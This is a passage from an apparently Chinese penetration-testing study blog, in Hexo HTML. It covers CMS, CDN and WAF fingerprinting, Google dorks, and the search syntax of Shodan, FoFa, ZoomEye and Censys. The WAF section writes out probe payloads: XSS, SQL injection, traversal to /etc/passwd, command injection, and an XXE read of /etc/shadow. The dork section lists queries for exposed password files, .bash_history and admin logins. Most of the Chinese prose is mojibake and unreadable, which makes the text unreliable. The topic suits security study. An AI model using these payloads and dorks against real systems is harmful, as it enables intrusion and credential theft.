class="headerlink" title="CMSè¯†åˆ«å·¥å…·"></a>CMSè¯†åˆ«å·¥å…·</h6><ul><li>whatweb(kali)</li><li>æµè§ˆå™¨æ’ä»¶</li><li><ul><li><a href="https://www.wappalyzer.com/">Wappalyzer</a></li><li><a href="https://www.whatruns.com/">whatruns</a></li></ul></li><li>åœ¨çº¿ç½‘ç«™</li><li><ul><li><a href="http://finger.tidesec.com/">æ½®æ±æŒ‡çº¹è¯†åˆ«</a></li></ul></li><li>ç¦»çº¿ç½‘ç«™</li><li><ul><li>å¾¡å‰‘æŒ‡çº¹æ‰«æå™¨(éœ€è¦.NET Frameworkï¼‰</li><li>Test404è½»é‡CMSæŒ‡çº¹è¯†åˆ«v2.1</li><li><a href="https://github.com/Tuhinshubhra/CMSeeK">CMSeek</a></li></ul></li></ul><h5 id="CDNæŒ‡çº¹è¯†åˆ«"><a href="#CDNæŒ‡çº¹è¯†åˆ«" class="headerlink" title="CDNæŒ‡çº¹è¯†åˆ«"></a>CDNæŒ‡çº¹è¯†åˆ«</h5><ul><li>(è¶…çº§)ping</li><li>nslookup</li><li>ldb(load balance detector  Kali)</li><li>å›½å†…ï¼š</li><li><ul><li><a href="http://cdn.chinaz.com/">å„åœ°CDNèŠ‚ç‚¹æµ‹é€Ÿç»“æœ - CDNäº‘è§‚æµ‹ - ç«™é•¿å·¥å…·</a></li></ul></li><li>å›½å¤–ï¼š</li><li><ul><li><a href="https://www.cdnplanet.com/tools/cdnfinder/">CDN Finder</a></li></ul></li><li>è„šæœ¬ï¼š</li><li><ul><li><a href="https://github.com/boy-hack/w8fuckcdn/">w8Fuckcdn</a> </li><li><a href="https://github.com/3xp10it/xcdn">xcdn</a></li></ul></li></ul><h5 id="WAFæŒ‡çº¹è¯†åˆ«"><a href="#WAFæŒ‡çº¹è¯†åˆ«" class="headerlink" title="WAFæŒ‡çº¹è¯†åˆ«"></a>WAFæŒ‡çº¹è¯†åˆ«</h5><p>Web. Application Firewall Web åº”ç”¨é˜²ç«å¢™</p><p>è¿‡æ»¤HTTP&#x2F;HTTPSçš„è¯·æ±‚</p><h6 id="WAFçš„ä½œç”¨"><a href="#WAFçš„ä½œç”¨" class="headerlink" title="WAFçš„ä½œç”¨"></a>WAFçš„ä½œç”¨</h6><ul><li><p>SQL Injection (SQLi)ï¼šé˜»æ­¢SQLæ³¨å…¥</p></li><li><p>Cross Site Scripting (XSS)ï¼šé˜»æ­¢è·¨ç«™è„šæœ¬æ”»å‡»</p></li><li><p>Local File Inclusion (LFI)ï¼š é˜»æ­£æ­¢åˆ©ç”¨æœ¬åœ°æ–‡ä»¶åŒ…å«æ¼æ´è¿›è¡Œæ”»å‡»</p></li><li><p>Remote File Inclusione(RFl)ï¼šé˜»æ­¢åˆ©ç”¨è¿œç¨‹æ–‡ä»¶åŒ…å«æ¼æ´è¿›è¡Œæ”»å‡»</p></li><li><p>Remote Code Execution(RCE)ï¼šé˜»æ­£æ­¢åˆ©ç”¨è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´è¿›è¡Œæ”»å‡» PHP Code Injectiodï¼šé˜»æ­£æ­¢PHPä»£ç æ³¨å…¥</p></li><li><p>HTTP Protocol Violationsï¼šé˜»æ­¢è¿åHTTPåè®®çš„æ¶æ„è®¿é—®</p></li><li><p>HTTPoXyï¼šé˜»æ­¢åˆ©ç”¨è¿œç¨‹ä»£ç†æ„ŸæŸ“æ¼æ´è¿›è¡Œæ”»å‡» Sshllshockï¼šé˜»æ­¢åˆ©ç”¨Shellshockæ¼æ´è¿›è¡Œæ”»å‡»</p></li><li><p>Session Fixationï¼š é˜»æ­¢åˆ©ç”¨Sessionä¼šè¯iDä¸å˜çš„æ¼æ´è¿›è¡Œæ”»å‡» ScannerDetectionï¼šé˜»æ­¢é»‘å®¢æ‰«æç½‘ç«™</p></li><li><p>Metadata&#x2F;ErrorLeakagesï¼šé˜»æ­¢æºä»£ç &#x2F;é”™è¯¯ä¿¡æ¯æ³„éœ² Project Honey Pot Blacklistï¼šèœœç½é¡¹ç›®é»‘åå•</p></li><li><p>GeolP Country Blockingï¼šæ ¹æ®åˆ¤æ–­IPåœ°å€å½’å±åœ°æ¥è¿›è¡ŒIPé˜»æ–­</p></li></ul><h6 id="WAFåˆ†ç±»"><a href="#WAFåˆ†ç±»" class="headerlink" title="WAFåˆ†ç±»"></a>WAFåˆ†ç±»</h6><p>ç¡¬ä»¶å‹WAFå‚å•†å®‰è£…ï¼‰</p><p>äº‘WAFï¼ˆé˜¿é‡Œäº‘ã€è…¾è®¯äº‘ã€åä¸ºäº‘.. ï¼‰</p><p>è½¯ä»¶å‹ WAFï¼ˆéƒ¨ç½²åœ¨ Apacheã€Nginx ç­‰ HTTPServerä¸­ï¼‰</p><h6 id="å¸¸è§WAFå‚å•†"><a href="#å¸¸è§WAFå‚å•†" class="headerlink" title="å¸¸è§WAFå‚å•†"></a>å¸¸è§WAFå‚å•†</h6><p>å„ç§äº‘ï¼šé˜¿é‡Œäº‘ã€è…¾è®¯äº‘ã€åä¸ºäº‘ã€ç™¾åº¦äº‘</p><p>å®‰å…¨ç‹—ã€å®å¡”ã€360ã€çŸ¥é“åˆ›å®‡ã€é•¿äº­ã€å®‰æ’ã€</p><h6 id="WAFè¯†åˆ«æ€è·¯"><a href="#WAFè¯†åˆ«æ€è·¯" class="headerlink" title="WAFè¯†åˆ«æ€è·¯"></a>WAFè¯†åˆ«æ€è·¯</h6><ul><li><p>é¢å¤–çš„cookie;</p></li><li><p>ä»»ä½•å“åº”æˆ–è¯·æ±‚çš„é™„åŠ æ ‡å¤´;</p></li><li><p>å“åº”å†…å®¹ï¼ˆå¦‚æœè¢«é˜»æ­¢è¯·æ±‚ï¼‰</p></li><li><p>å“åº”ä»£ç ï¼ˆå¦‚æœè¢«é˜»æ­¢è¯·æ±‚ï¼‰</p></li><li><p>IPåœ°å€ï¼ˆäº‘WAFï¼‰ï¼›</p></li><li><p>JSå®¢æˆ·ç«¯æ¨¡å—ï¼ˆå®¢æˆ·ç«¯WAFï¼‰</p></li></ul><h6 id="WAFè§¦å‘æ‹¦æˆªæ–¹å¼"><a href="#WAFè§¦å‘æ‹¦æˆªæ–¹å¼" class="headerlink" title="WAFè§¦å‘æ‹¦æˆªæ–¹å¼"></a>WAFè§¦å‘æ‹¦æˆªæ–¹å¼</h6><pre class="language-javascript" data-language="javascript"><code class="language-javascript">xsstring <span class="token operator">=</span> '<span class="token operator">&lt;</span>script<span class="token operator">></span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">"Xss"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span></code></pre><pre class="language-mysql" data-language="mysql"><code class="language-mysql">sqlistring &#x3D; &quot;UNION SELECT ALL FROM information schema AND &#39; or SLEEP(5) or &#39;&quot;</code></pre><pre class="language-bash" data-language="bash"><code class="language-bash">Ifistring <span class="token operator">=</span> "<span class="token punctuation">..</span>/<span class="token punctuation">..</span>/./<span class="token punctuation">..</span>/etc/passwd</code></pre><pre class="language-bash" data-language="bash"><code class="language-bash">rcestring <span class="token operator">=</span> <span class="token string">'/bin/cat /etc/passwd; ping 127.0.0.1; curl google.com'</span></code></pre><pre class="language-javascript" data-language="javascript"><code class="language-javascript">xxestring <span class="token operator">=</span> '<span class="token operator">&lt;</span><span class="token operator">!</span><span class="token constant">ENTITY</span> xxe <span class="token constant">SYSTEM</span> <span class="token string">"file:///etc/shadow"</span><span class="token operator">></span><span class="token punctuation">]</span><span class="token operator">></span><span class="token operator">&lt;</span>pwn<span class="token operator">></span><span class="token operator">&amp;</span>hack<span class="token punctuation">;</span><span class="token operator">&lt;</span><span class="token operator">/</span>pwn<span class="token operator">></span>"</code></pre><h6 id="WAFè¯†åˆ«å·¥å…·"><a href="#WAFè¯†åˆ«å·¥å…·" class="headerlink" title="WAFè¯†åˆ«å·¥å…·"></a>WAFè¯†åˆ«å·¥å…·</h6><p>Kaliè‡ªå¸¦ï¼š</p><ul><li><p><a href="https://github.com/EnableSecurity/wafwOOf">wafwOOf</a> </p></li><li><p>wafw00f <a href="https://www.12306.cn/">https://www.12306.cn</a></p></li><li><p>nmap <a href="http://www.12306.cn/">www.12306.cn</a> â€“script&#x3D;http-waf-detect.nse</p></li><li><p>sqlmap -u â€œxxx.com?id&#x3D;1â€ â€“identify-waf</p></li></ul><p>å…¶ä»–ï¼š</p><ul><li><a href="https://github.com/Oxlnfection/Awesome-WAF">Build software better, together</a></li></ul><h5 id="æœç´¢å¼•æ“-Googleè¯­æ³•"><a href="#æœç´¢å¼•æ“-Googleè¯­æ³•" class="headerlink" title="æœç´¢å¼•æ“(Googleè¯­æ³•)"></a>æœç´¢å¼•æ“(Googleè¯­æ³•)</h5><p>æŸ¥æ‰¾æ­£æ–‡å«æœ‰å…³é”®å­—çš„ç½‘é¡µ</p><h6 id="intext"><a href="#intext" class="headerlink" title="intext"></a>intext</h6><pre class="language-makefile" data-language="makefile"><code class="language-makefile"><span class="token target symbol">intext</span><span class="token punctuation">:</span>åå°ç™»é™†      åªè¿”å›æ­£æ–‡åŒ…å«â€œåå°ç™»é™†â€çš„ç½‘é¡µ</code></pre><h6 id="intitle"><a href="#intitle" class="headerlink" title="intitle"></a>intitle</h6><pre class="language-makefile" data-language="makefile"><code class="language-makefile"><span class="token target symbol">intitle</span><span class="token punctuation">:</span>åå°ç™»é™†           åªè¿”å›æ ‡é¢˜ä¸­åŒ…å«â€œåå°ç™»å½•â€çš„ç½‘é¡µ</code></pre><pre class="language-makefile" data-language="makefile"><code class="language-makefile"><span class="token target symbol">allintitle</span><span class="token punctuation">:</span>åå°ç™»é™† ç®¡ç†å‘˜       å¯ä»¥æŒ‡å®šå¤šä¸ªè¯</code></pre><h6 id="inurl"><a href="#inurl" class="headerlink" title="inurl"></a>inurl</h6><pre class="language-makefile" data-language="makefile"><code class="language-makefile"><span class="token target symbol">inurl</span><span class="token punctuation">:</span>login</code></pre><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token literal-property property">inurl</span><span class="token operator">:</span><span class="token operator">/</span>admin<span class="token operator">/</span>login<span class="token punctuation">.</span>php      æŸ¥æ‰¾ç®¡ç†å‘˜ç™»é™†é¡µé¢<span class="token literal-property property">inurl</span><span class="token operator">:</span><span class="token operator">/</span>phpmyadmin<span class="token operator">/</span>index<span class="token punctuation">.</span>php  æŸ¥æ‰¾åå°æ•°æ®åº“ç®¡ç†å‘˜é¡µé¢<span class="token literal-property property">allinurl</span><span class="token operator">:</span>                  å¯ä»¥æŒ‡å®šå¤šä¸ªè¯</code></pre><h6 id="site"><a href="#site" class="headerlink" title="site"></a>site</h6><pre class="language-mipsasm" data-language="mipsasm"><code class="language-mipsasm">site:baidu.com inurl:login         åªåœ¨baidu.com ä¸­æŸ¥æ‰¾urlä¸­å«æœ‰ Loginçš„ç½‘é¡µ</code></pre><h6 id="filetype"><a href="#filetype" class="headerlink" title="filetype"></a>filetype</h6><p>æŒ‡å®šè®¿é—®çš„æ–‡ä»¶ç±»å‹</p><pre class="language-makefile" data-language="makefile"><code class="language-makefile"><span class="token target symbol">site</span><span class="token punctuation">:</span>xcu.edu.cn filetype<span class="token punctuation">:</span>pdf</code></pre><h6 id="link"><a href="#link" class="headerlink" title="link"></a>link</h6><p>æŒ‡å®šè¿æ¥çš„ç½‘é¡µ</p><pre class="language-bash" data-language="bash"><code class="language-bash">link:www.baidu.com </code></pre><h6 id="related"><a href="#related" class="headerlink" title="related"></a>related</h6><p>ç›¸ä¼¼ç±»å‹çš„ç½‘é¡µ</p><pre class="language-makefile" data-language="makefile"><code class="language-makefile"><span class="token target symbol">related</span><span class="token punctuation">:</span>www.xcu.edu.cn</code></pre><h6 id="cache"><a href="#cache" class="headerlink" title="cache:"></a>cache:</h6><p>è¿”å›æµè§ˆå™¨å¯¹ç½‘ç«™çš„ç¼“å­˜</p><pre class="language-makefile" data-language="makefile"><code class="language-makefile"><span class="token target symbol">cache</span><span class="token punctuation">:</span>www.xcu.edu.cn</code></pre><h6 id="info"><a href="#info" class="headerlink" title="info:"></a>info:</h6><p>è¿”å›ç«™ç‚¹çš„æŒ‡å®šä¿¡æ¯</p><h6 id="define"><a href="#define" class="headerlink" title="define:"></a>define:</h6><p>è¿”å›æŸä¸ªè¯è¯­çš„å®šä¹‰</p><h6 id="phonebook"><a href="#phonebook" class="headerlink" title="phonebook:"></a>phonebook:</h6><p>ç”µè¯ç°¿æŸ¥è¯¢ç¾å›½è¡—é“åœ°å€å’Œç”µè¯å·ç ä¿¡æ¯</p><h6 id="æŸ¥æ‰¾ç½‘ç«™åå°"><a href="#æŸ¥æ‰¾ç½‘ç«™åå°" class="headerlink" title="æŸ¥æ‰¾ç½‘ç«™åå°"></a>æŸ¥æ‰¾ç½‘ç«™åå°</h6><ul><li>site:xx.com intext:ç®¡ç†</li><li>site:xx.com inurl:login</li><li>site:xx.com intitle:åå°</li></ul><h6 id="æŸ¥çœ‹æœåŠ¡å™¨ä½¿ç”¨çš„ç¨‹åº"><a href="#æŸ¥çœ‹æœåŠ¡å™¨ä½¿ç”¨çš„ç¨‹åº" class="headerlink" title="æŸ¥çœ‹æœåŠ¡å™¨ä½¿ç”¨çš„ç¨‹åº"></a>æŸ¥çœ‹æœåŠ¡å™¨ä½¿ç”¨çš„ç¨‹åº</h6><ul><li>site:xx.com filetype:asp</li><li>site:xx.com filetype:php</li><li>site:xx.com filetype:jsp</li><li>site:xx.com filetype:aspx</li></ul><h6 id="æŸ¥çœ‹ä¸Šä¼ æ¼æ´"><a href="#æŸ¥çœ‹ä¸Šä¼ æ¼æ´" class="headerlink" title="æŸ¥çœ‹ä¸Šä¼ æ¼æ´"></a>æŸ¥çœ‹ä¸Šä¼ æ¼æ´</h6><ul><li>site:xx.com inurl:file</li><li>site:xx.com inurl:load</li></ul><h6 id="index-of"><a href="#index-of" class="headerlink" title="index of"></a>index of</h6><p>åˆ©ç”¨ Index of è¯­æ³•å»å‘ç°å…è®¸ç›®å½•æµè§ˆçš„webç½‘ç«™ï¼Œå°±åƒåœ¨æœ¬åœ°çš„æ™®é€šç›®å½•ä¸€æ ·</p><pre class="language-bash" data-language="bash"><code class="language-bash">index of /adminindex of /passwdindex of /passwordindex of /mail<span class="token string">"index of /"</span> +passwd<span class="token string">"index of /"</span> +password.txt<span class="token string">"index of /"</span>.htaccess<span class="token string">"index of /root"</span><span class="token string">"index of/cgi-bin"</span><span class="token string">"index of/logs"</span><span class="token string">"index of /config"</span></code></pre><p>inurl</p><p>è€Œä¸Šé¢è¿™äº›å‘½ä»¤ä¸­ç”¨çš„æœ€å¤šçš„å°±æ˜¯ inurl: äº†ï¼Œåˆ©ç”¨è¿™ä¸ªå‘½ä»¤ï¼Œå¯ä»¥æŸ¥åˆ°å¾ˆå¤šæ„æƒ³ä¸åˆ°çš„ä¸œè¥¿</p><pre class="language-bash" data-language="bash"><code class="language-bash">åˆ©ç”¨ allinurl:winnt/system32/ æŸ¥è¯¢ï¼šåˆ—å‡ºçš„æœåŠ¡å™¨ä¸Šæœ¬æ¥åº”è¯¥å—é™åˆ¶çš„è¯¸å¦‚â€œsystem32â€ ç­‰ç›®å½•ï¼Œå¦‚æœä½ è¿æ°”è¶³å¤Ÿå¥½ï¼Œä½ ä¼šå‘ç°â€œsystem32â€ ç›®å½•é‡Œçš„â€œcmd.exeâ€ æ–‡ä»¶ï¼Œå¹¶èƒ½æ‰§è¡Œä»–ï¼Œæ¥ä¸‹æ¥å°±æ˜¯æå‡æƒé™å¹¶æ”»å…‹äº†ã€‚æŸ¥è¯¢ allinurl:wwwboard/passwd.txt  å°†åˆ—å‡ºæ‰€æœ‰æœ‰â€œWWWBoard Password vulnerabilityâ€æ¼æ´çš„æœåŠ¡å™¨æŸ¥è¯¢  inurl:.bash_history  å°†åˆ—å‡ºäº’è”ç½‘ä¸Šå¯ä»¥çœ‹è§ â€œinurl:.bash_historyâ€ æ–‡ä»¶çš„æœåŠ¡å™¨ã€‚è¿™æ˜¯ä¸€ä¸ªå‘½ä»¤å†å²æ–‡ä»¶ï¼Œè¿™ä¸ªæ–‡ä»¶åŒ…å«äº†ç®¡ç†å‘˜æ‰§è¡Œçš„å‘½ä»¤ï¼Œæœ‰æ—¶ä¼šåŒ…å«ä¸€äº›æ•æ„Ÿä¿¡æ¯æ¯”å¦‚ç®¡ç†å‘˜é”®å…¥çš„å¯†ç ã€‚æŸ¥è¯¢ inurl:config.txt  å°†çœ‹è§ç½‘ä¸Šæš´éœ²äº†â€œinurl:config.txtâ€æ–‡ä»¶çš„æœåŠ¡å™¨ï¼Œè¿™ä¸ªæ–‡ä»¶åŒ…å«äº†ç»è¿‡å“ˆå¸Œç¼–ç çš„ç®¡ç†å‘˜çš„å¯†ç å’Œæ•°æ®åº“å­˜å–çš„å…³é”®ä¿¡æ¯ã€‚</code></pre><p>è¿˜æœ‰ä¸€äº›å…¶ä»–ä¸€äº›ä½¿ç”¨â€œinurl:â€å’Œâ€œallinurl:â€æŸ¥è¯¢ç»„åˆçš„ä¾‹å­</p><pre class="language-makefile" data-language="makefile"><code class="language-makefile"><span class="token target symbol">inurl</span><span class="token punctuation">:</span>admin filetype<span class="token punctuation">:</span>txt<span class="token target symbol">inurl</span><span class="token punctuation">:</span>admin filetype<span class="token punctuation">:</span>db<span class="token target symbol">inurl</span><span class="token punctuation">:</span>admin filetype<span class="token punctuation">:</span>cfg<span class="token target symbol">inurl</span><span class="token punctuation">:</span>mysql filetype<span class="token punctuation">:</span>cfg<span class="token target symbol">inurl</span><span class="token punctuation">:</span>passwd filetype<span class="token punctuation">:</span>txt<span class="token target symbol">inurl</span><span class="token punctuation">:</span>â€wwwroot/*.â€<span class="token target symbol">inurl</span><span class="token punctuation">:</span>adpassword.txt<span class="token target symbol">inurl</span><span class="token punctuation">:</span>webeditor.php<span class="token target symbol">inurl</span><span class="token punctuation">:</span>file_upload.php<span class="token target symbol">inurl</span><span class="token punctuation">:</span>gov filetype<span class="token punctuation">:</span>xls â€œrestrictedâ€<span class="token target symbol">index of ftp +.mdb allinurl</span><span class="token punctuation">:</span>/cgi-bin/ +mailto</code></pre><h6 id="è¯­æ³•æ•°æ®åº“-å·¥å…·"><a href="#è¯­æ³•æ•°æ®åº“-å·¥å…·" class="headerlink" title="è¯­æ³•æ•°æ®åº“&amp;å·¥å…·"></a>è¯­æ³•æ•°æ®åº“&amp;å·¥å…·</h6><p><a href="https://www.exploit-db.com/googlehacking-database">Google Hacking Database</a></p><p>[Google Dork List](<a href="https://github.com/BullsEye0/google_dork">https://github.com/BullsEye0/google_dork</a>_<br>list)</p><p><a href="https://github.com/opsdisk/pagodo">pagodo - Passive Google Dork</a></p><h5 id="ç½‘ç»œç©ºé—´æœç´¢å¼•æ“"><a href="#ç½‘ç»œç©ºé—´æœç´¢å¼•æ“" class="headerlink" title="ç½‘ç»œç©ºé—´æœç´¢å¼•æ“"></a>ç½‘ç»œç©ºé—´æœç´¢å¼•æ“</h5><h6 id="shodan"><a href="#shodan" class="headerlink" title="shodan"></a><a href="https://www.shodan.io/">shodan</a></h6><p>shodanç½‘ç»œæœç´¢å¼•æ“åå‘ç½‘ç»œè®¾å¤‡ä»¥åŠæœåŠ¡å™¨çš„æœç´¢</p><p>ç½‘ç»œç±»</p><pre class="language-bash" data-language="bash"><code class="language-bash">port          ç«¯å£  product     æ‰€ä½¿ç”¨çš„è½¯ä»¶æˆ–äº§å“os          æ“ä½œç³»ç»Ÿç±»å‹versionï¼š    æœç´¢æŒ‡å®šçš„è½¯ä»¶ç‰ˆæœ¬ï¼Œä¾‹å¦‚ version:<span class="token string">"1.3.2"</span>netï¼šæœç´¢æŒ‡å®šçš„IPåœ°å€æˆ–å­ç½‘ï¼Œä¾‹å¦‚ net:<span class="token string">"110.43.140.0/24"</span></code></pre><p>åº”ç”¨ç±»</p><pre class="language-bash" data-language="bash"><code class="language-bash">html.title  ç½‘é¡µæ ‡é¢˜http.html   ç½‘é¡µå†…å®¹http.server httpè¯·æ±‚è¿”å›ä¸­serverçš„ç±»å‹http.status httpè¯·æ±‚è¿”å›å“åº”ç çš„çŠ¶æ€<span class="token function">hostname</span>  ä¸»æœºç±»å‹http.favicon.hash iconå¯¹åº”hashvuln       CVEæ¼æ´ç¼–å·ï¼Œä¾‹å¦‚ï¼švulnï¼šCVE-2014-0723</code></pre><p>åœ°ç†ä½ç½®ç±»</p><pre class="language-bash" data-language="bash"><code class="language-bash">countryï¼šæœç´¢æŒ‡å®šçš„å›½å®¶ï¼Œä¾‹å¦‚ country:<span class="token string">"CN"</span>cityï¼šæœç´¢æŒ‡å®šçš„åŸå¸‚ï¼Œä¾‹å¦‚ city:<span class="token string">"Beijing"</span>orgï¼šæœç´¢æŒ‡å®šçš„ç»„ç»‡æˆ–å…¬å¸ï¼Œä¾‹å¦‚ org:<span class="token string">"google"</span>ispï¼šæœç´¢æŒ‡å®šçš„ISPä¾›åº”å•†ï¼Œä¾‹å¦‚ isp:<span class="token string">"China Telecom"</span></code></pre><p>å…¶ä»–<br>å¦‚æœéœ€è¦å¤šä¸ªè¯åŒæ—¶æœç´¢æ—¶ï¼Œåªéœ€è¦åœ¨æ¯ä¸ªå…³é”®å­—é—´åŠ ç©ºæ ¼åˆ†å‰²å°±è¡Œï¼Œæ¯”å¦‚ï¼šcountry:â€œCNâ€ city:â€œBeijingâ€<br>å½“ä¸éœ€è¦æŸä¸ªè¯æ—¶ï¼Œå¯ä»¥ç”¨â€-â€åŠ ä¸Šå…³é”®è¯æ¥è¿›è¡Œå»é™¤ã€‚æ¯”å¦‚ï¼šâ€-port:80â€ï¼ˆæ’é™¤80ç«¯å£æœç´¢ç»“æœï¼‰<br><a href="https://github.com/random-robbie/My-Shodan-Scripts">My-Shodan-Scripts</a></p><h6 id="censys"><a href="#censys" class="headerlink" title="censys"></a><a href="https://search.censys.io/">censys</a></h6><ul><li>23.0.0.0&#x2F;8 or 8.8.8.0&#x2F;24ã€€ã€€å¯ä»¥ä½¿ç”¨and or not</li><li>80.http.get.status_code: 200ã€€ã€€æŒ‡å®šçŠ¶æ€</li><li>80.http.get.status_code:[200 TO 300]ã€€ã€€200-300ä¹‹é—´çš„çŠ¶æ€ç </li><li>location.country_code: DEã€€ã€€å›½å®¶</li><li>protocols: (â€œ23&#x2F;telnetâ€ or â€œ21&#x2F;ftpâ€)ã€€ã€€åè®®</li><li>tags: scadaã€€ã€€æ ‡ç­¾</li><li>80.http.get.headers.serverï¼šnginxã€€ã€€æœåŠ¡å™¨ç±»å‹ç‰ˆæœ¬</li><li>autonomous_system.description: Universityã€€ã€€ç³»ç»Ÿæè¿°</li><li>æ­£åˆ™</li></ul><h6 id="é’Ÿé¦—ä¹‹çœ¼ZoomEye"><a href="#é’Ÿé¦—ä¹‹çœ¼ZoomEye" class="headerlink" title="é’Ÿé¦—ä¹‹çœ¼ZoomEye"></a><a href="https://www.zoomeye.org/">é’Ÿé¦—ä¹‹çœ¼ZoomEye</a></h6><p>é’Ÿé¦—ä¹‹çœ¼æœç´¢å¼•æ“åå‘webåº”ç”¨å±‚é¢çš„æœç´¢ã€‚</p><ul><li>app:nginxã€€ã€€ç»„ä»¶å</li><li>ver:1.0ã€€ã€€ç‰ˆæœ¬</li><li>os:windowsã€€ã€€æ“ä½œç³»ç»Ÿ</li><li>country:â€Chinaâ€ã€€ã€€å›½å®¶</li><li>city:â€hangzhouâ€ã€€ã€€åŸå¸‚</li><li>port:80ã€€ã€€ç«¯å£</li><li>hostname:googleã€€ã€€ä¸»æœºå</li><li>site:thief.oneã€€ã€€ç½‘ç«™åŸŸå</li><li>desc:nmaskã€€ã€€æè¿°</li><li>keywords:nmaskâ€™blogã€€ã€€å…³é”®è¯</li><li>service:ftpã€€ã€€æœåŠ¡ç±»å‹</li><li>ip:8.8.8.8ã€€ã€€ipåœ°å€</li><li>cidr:8.8.8.8&#x2F;24ã€€ã€€ipåœ°å€æ®µ</li></ul><h6 id="FoFa"><a href="#FoFa" class="headerlink" title="FoFa"></a><a href="https://fofa.info/">FoFa</a></h6><p>FoFaæœç´¢å¼•æ“åå‘èµ„äº§æœç´¢ã€‚</p><p>æœç´¢è¯­æ³•</p><ul><li>title&#x3D;â€abcâ€ ä»æ ‡é¢˜ä¸­æœç´¢abcã€‚ä¾‹ï¼šæ ‡é¢˜ä¸­æœ‰åŒ—äº¬çš„ç½‘ç«™ã€‚</li><li>header&#x3D;â€abcâ€ ä»httpå¤´ä¸­æœç´¢abcã€‚ä¾‹ï¼šjbossæœåŠ¡å™¨ã€‚</li><li>body&#x3D;â€abcâ€ ä»htmlæ­£æ–‡ä¸­æœç´¢abcã€‚ä¾‹ï¼šæ­£æ–‡åŒ…å«Hacked byã€‚</li><li>domain&#x3D;â€qq.comâ€ æœç´¢æ ¹åŸŸåå¸¦æœ‰qq.comçš„ç½‘ç«™ã€‚ä¾‹ï¼š æ ¹åŸŸåæ˜¯qq.comçš„ç½‘ç«™ã€‚</li><li>host&#x3D;â€.gov.cnâ€ ä»urlä¸­æœç´¢.gov.cn,æ³¨æ„æœç´¢è¦ç”¨hostä½œä¸ºåç§°ã€‚</li><li>port&#x3D;â€443â€ æŸ¥æ‰¾å¯¹åº”443ç«¯å£çš„èµ„äº§ã€‚ä¾‹ï¼š æŸ¥æ‰¾å¯¹åº”443ç«¯å£çš„èµ„äº§ã€‚</li><li>ip&#x3D;â€1.1.1.1â€ ä»ipä¸­æœç´¢åŒ…å«1.1.1.1çš„ç½‘ç«™,æ³¨æ„æœç´¢è¦ç”¨ipä½œä¸ºåç§°ã€‚</li><li>protocol&#x3D;â€httpsâ€ æœç´¢åˆ¶å®šåè®®ç±»å‹(åœ¨å¼€å¯ç«¯å£æ‰«æçš„æƒ…å†µä¸‹æœ‰æ•ˆ)ã€‚ä¾‹ï¼š æŸ¥è¯¢httpsåè®®èµ„äº§ã€‚</li><li>city&#x3D;â€Beijingâ€ æœç´¢æŒ‡å®šåŸå¸‚çš„èµ„äº§ã€‚ä¾‹ï¼š æœç´¢æŒ‡å®šåŸå¸‚çš„èµ„äº§ã€‚</li><li>region&#x3D;â€Zhejiangâ€ æœç´¢æŒ‡å®šè¡Œæ”¿åŒºçš„èµ„äº§ã€‚ä¾‹ï¼š æœç´¢æŒ‡å®šè¡Œæ”¿åŒºçš„èµ„äº§ã€‚</li><li>country&#x3D;â€CNâ€ æœç´¢æŒ‡å®šå›½å®¶(ç¼–ç )çš„èµ„äº§ã€‚ä¾‹ï¼š æœç´¢æŒ‡å®šå›½å®¶(ç¼–ç )çš„èµ„äº§ã€‚</li><li>cert&#x3D;â€google.comâ€ æœç´¢è¯ä¹¦(httpsæˆ–è€…imapsç­‰)ä¸­å¸¦æœ‰google.comçš„èµ„äº§ã€‚</li></ul><p>é«˜çº§æœç´¢ï¼š</p><ul><li>title&#x3D;â€powered byâ€ &amp;&amp; title!&#x3D;discuz</li><li>title!&#x3D;â€powered byâ€ &amp;&amp; body&#x3D;discuz</li><li>( body&#x3D;â€content&#x3D;\â€WordPressâ€ || (header&#x3D;â€X-Pingbackâ€ &amp;&amp; header&#x3D;â€&#x2F;xmlrpc.phpâ€ &amp;&amp; body&#x3D;â€&#x2F;wp-includes&#x2F;â€œ) ) &amp;&amp; host&#x3D;â€gov.cnâ€</li></ul><h6 id="Dnsdbæœç´¢å¼•æ“"><a href="#Dnsdbæœç´¢å¼•æ“" class="headerlink" title="Dnsdbæœç´¢å¼•æ“"></a><a href="https://www.dnsdb.io/">Dnsdbæœç´¢å¼•æ“</a></h6><p>dnsdbæœç´¢å¼•æ“æ˜¯ä¸€æ¬¾é’ˆå¯¹dbsè§£æçš„æŸ¥è¯¢å¹³å°ã€‚</p><p>æœç´¢è¯­æ³•</p><p>DnsDBæŸ¥è¯¢è¯­æ³•ç»“æ„ä¸ºæ¡ä»¶1 æ¡ä»¶2 æ¡ä»¶3 â€¦., æ¯ä¸ªæ¡ä»¶ä»¥ç©ºæ ¼é—´éš”, DnsDB ä¼šæŠŠæ»¡è¶³æ‰€æœ‰æŸ¥è¯¢æ¡ä»¶çš„ç»“æœè¿”å›ç»™ç”¨æˆ·.</p><p>åŸŸåæŸ¥è¯¢æ¡ä»¶</p><p>åŸŸåæŸ¥è¯¢æ˜¯æŒ‡æŸ¥è¯¢é¡¶çº§ç§æœ‰åŸŸåæ‰€æœ‰çš„DNSè®°å½•, æŸ¥è¯¢è¯­æ³•ä¸ºdomain:.<br>ä¾‹å¦‚æŸ¥è¯¢google.com çš„æ‰€æœ‰DNSè®°å½•: domain:google.com.<br>åŸŸåæŸ¥è¯¢å¯ä»¥çœç•¥domain:.</p><p>ä¸»æœºæŸ¥è¯¢æ¡ä»¶</p><p>æŸ¥è¯¢è¯­æ³•:host:<br>ä¾‹å¦‚æŸ¥è¯¢ä¸»æœºåœ°å€ä¸ºmp3.example.comçš„DNSè®°å½•: host:map3.example.com<br>ä¸»æœºæŸ¥è¯¢æ¡ä»¶ä¸åŸŸåæŸ¥è¯¢æŸ¥è¯¢æ¡ä»¶çš„åŒºåˆ«åœ¨äº, ä¸»æœºæŸ¥è¯¢åŒ¹é…çš„æ˜¯DNSè®°å½•çš„Hostå€¼</p><p>æŒ‰DNSè®°å½•ç±»å‹æŸ¥è¯¢</p><p>æŸ¥è¯¢è¯­æ³•: type:.<br>ä¾‹å¦‚åªæŸ¥è¯¢Aè®°å½•: 